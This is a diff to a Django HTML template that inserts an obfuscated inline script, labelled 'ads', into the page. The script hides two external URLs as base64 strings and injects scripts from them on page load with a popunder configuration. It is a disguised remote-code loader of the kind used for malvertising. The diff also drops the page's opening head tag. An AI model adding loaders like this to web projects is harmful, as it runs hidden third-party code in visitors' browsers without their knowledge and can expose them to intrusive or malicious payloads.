@@ -1,5 +1,5 @@
 {% load static %}
-<html lang="en"><head>
+<html lang="en">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
@@ -40,7 +40,15 @@
         }
     </style>
 
+<!-- ads-->
+<script type="text/javascript" data-cfasync="false">
+    /*<![CDATA[/* */
+    (function(){var u=window,z="a7b52e1519b4cc079a8df76d2f741669",f=[["siteId",261+433-319+5163449],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],n=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL1ZnWC9qbVovcWNsdXN0ZXJpemUubWluLmpz","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvb2lkZXZpY2UubWluLmpz"],y=-1,t,q,l=function(){clearTimeout(q);y++;if(n[y]&&!(1761968265000<(new Date).getTime()&&1<y)){t=u.document.createElement("script");t.type="text/javascript";t.async=!0;var d=u.document.getElementsByTagName("script")[0];t.src="https://"+atob(n[y]);t.crossOrigin="anonymous";t.onerror=l;t.onload=function(){clearTimeout(q);u[z.slice(0,16)+z.slice(0,16)]||l()};q=setTimeout(l,5E3);d.parentNode.insertBefore(t,d)}};if(!u[z]){try{Object.freeze(u[z]=f)}catch(e){}l()}})();
+    /*]]>/* */
+    </script>
+<!-- ads-->
 {% include "nava.html" %}
+
 <div class="message" style="padding-top: 75px;" > 
     {% if messages %}
         {% for message in messages %}
@@ -83,7 +91,6 @@
                 </footer>
     </div>
 </div>
-
 
  <!-- Bootstrap core JS-->
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
